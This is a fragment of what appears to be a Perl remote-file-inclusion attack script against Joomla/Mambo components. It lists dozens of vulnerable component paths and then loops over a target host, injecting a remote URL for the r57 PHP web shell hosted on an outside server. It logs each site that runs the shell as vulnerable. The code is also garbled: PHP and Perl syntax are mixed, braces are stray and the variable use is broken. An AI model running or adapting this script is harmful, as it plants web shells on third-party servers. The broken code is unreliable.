$rfi514="/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=";
$rfi515="/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=";
$rfi516="/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=";
$rfi517="/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=";
$rfi518="/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=";
$rfi519="/components/com_joomlaboard/file_upload.php?sbp=";
$rfi520="/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=";
$rfi531="/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=";
$rfi532="/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=";
$rfi533="/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=";
$rfi534="/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=";
$rfi535="/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=";
$rfi536="/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=";
$rfi537="/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=";
$rfi538="/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=";
$rfi539="/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=";
$rfi540="/modules/mod_as_category.php?mosConfig_absolute_path=";
$rfi541="/components/com_articles.php?absolute_path=";
$rfi542="/classes/html/com_articles.php?absolute_path=";
$rfi543="/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=";
$rfi544="/templates/be2004-2/index.php?mosConfig_absolute_path=";
$rfi545="/libraries/pcl/pcltar.php?g_pcltar_lib_dir=";
$rfi546="/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=";
$rfi547="/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=";
$rfi548="/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=";
$rfi549="/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=";
$rfi550="/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=";
$rfi551="/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=";
$rfi552="/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=";
$rfi553="/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=";
$rfi554="/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=";
$rfi555="/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=";
$rfi556="/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=";
$rfi557="/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=";
$rfi558="/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=";
$rfi559="/components/com_mp3_allopass/allopass.php?mosConfig_live_site=";
$rfi560="/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=";
$rfi561="/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=";
$rfi562="/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=";
$rfi563="/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=";
$rfi564="/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=";
$rfi565="/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=";
$rfi566="/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=";
$rfi567="/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=";
$rfi568="/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=";
$rfi569="/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=";
$rfi570="/administrator/components/com_color/admin.color.php?mosConfig_live_site=";
$rfi571="/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=";
$rfi572="/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=";
$rfi573="/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=";
$rfi574="/index.php?option=com_adsmanager&mosConfig_absolute_path=";
$rfi575="/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=";
$rfi576="/com_magazine_3_0_1/magazine.functions.php?config=";
$rfi577="/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=";
$rfi578="/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=";
$rfi579="/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=";

$int = $values[ rand(4) ];
for($int=1;$int<430;$int++){
@cmdgif="http://usuarios.lycos.es/poizonbox/r57.txt?";
$lol="rfi";
$asd=$lol.$int;
$url2="http://".$host."/".$$asd."@cmdgif?";
my $req=HTTP::Request->new(GET=>$url2);
my $ua=LWP::UserAgent->new();
$ua->timeout(10);
my $response=$ua->request($req);

if ($response->is_success) {
 if( $response->content =~ /r57shell/ && $response->content =~ /by/ ){
open(FILE,">>file.txt");
print FILE "$url2\n";
close(FILE);
print "[>] $url2 is vulnerable\n";
}}
}
}
